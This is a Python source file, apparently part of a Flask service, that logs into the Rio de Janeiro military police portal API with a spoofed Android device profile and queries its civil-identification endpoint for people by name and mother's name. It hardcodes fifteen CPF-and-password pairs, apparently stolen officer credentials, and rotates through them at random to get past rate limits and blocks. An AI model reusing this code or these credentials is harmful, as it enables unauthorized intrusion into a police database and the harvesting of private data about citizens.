import requests
import json
import random
from colorama import Fore
from auth.validacao import validacao
from flask import jsonify, make_response

def GetStr(texto, inicio, fim):
    try:
        return texto.split(inicio)[1].split(fim)[0]
    except Exception:
        return "S/N"


def logar(cpf, senha):
    headers = {
        'Host': 'api-app-portal.pmerj.seg.br',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-N976N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36',
        'X-Requested-With': 'oprj.pmerj.rj.gov.br',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    json_data = {
        'user': {
            'NR_Cpf': cpf,
            'Senha': senha,
            'device': {
                'cordova': '11.0.0',
                'model': 'SM-N976N',
                'platform': 'Android',
                'uuid': '63152d56cd04d4d3',
                'version': '7.1.2',
                'manufacturer': 'samsung',
                'isVirtual': False,
                'serial': 'd56cd04d4d363152',
            },
            'lat': 0,
            'lng': 0,
        },
        'lat': 0,
        'lng': 0,
        'device': {
            'cordova': '11.0.0',
            'model': 'SM-N976N',
            'platform': 'Android',
            'uuid': '63152d56cd04d4d3',
            'version': '7.1.2',
            'manufacturer': 'samsung',
            'isVirtual': False,
            'serial': 'd56cd04d4d363152',
        },
        'id_onesignal': None,
    }

    response = requests.post('http://api-app-portal.pmerj.seg.br/system_api/authentication/authMobile', headers=headers, json=json_data).text

    token = GetStr(response, 'token":"', '"')

    if 'token":"' in response:
        with open("./token.txt", 'w') as f:
            f.write(token)
    else:
        print(Fore.CYAN + f"[+] {cpf}:{senha} [ {response} ]")


def pegar_token():
    with open("token.txt", "r", encoding='utf-8') as f:
        token = f.read().strip()
    return token


def rj_consulta(nome, mae):
    token_login = pegar_token()

    headers = {
        'authority': 'portal.pmerj.rj.gov.br',
        'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer '+token_login,
        'origin': 'https://portal.pmerj.rj.gov.br',
        'referer': 'https://portal.pmerj.rj.gov.br/consultas/consultapessoas',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    }

    json_data = {
        'vmae': mae,
        'vnasc': '',
        'vnome': nome,
        'vpai': '',
        'vvulgo': '',
    }

    response = requests.post('https://portal.pmerj.rj.gov.br/190/api/IdentCivil/getPessoa', headers=headers, json=json_data)

    if any(keyword in response.text for keyword in ['invalid algorithm', 'Unexpected token', 'Too many requests, please try again later']):
        print(Fore.RED + f'[+] RJ-SUPTIC RELOGANDO')
        dados = {
            '08979075740': '212223',
            '05500223763': '194913',
            '10591445735': 'luiza2010',
            '04567332725': 'ventu89',
            '02966593717': '481707',
            '07626194730': 'servir',
            '10031435718': '004243',
            '07421857702': 'sau05492',
            '09292964780': '171299',
            '03046659750': '180871',
            '02899026739': '3sargent',
            '01917934777': 'ags72840',
            '01443955760': 'p4t7z152',
            '08916122708': 'tandera1',
            '08387315702': 'snipes75'
        }

        cpf_aleatorio = random.choice(list(dados.keys()))
        senha_correspondente = dados[cpf_aleatorio]

        logar(cpf_aleatorio, senha_correspondente)


        return jsonify({'erro': 'retestar - pos estava fazendo o login dnv'})
    else:
        return jsonify({'dados': response.json(), 'base_dados': 'SUPTIC - RJ'})
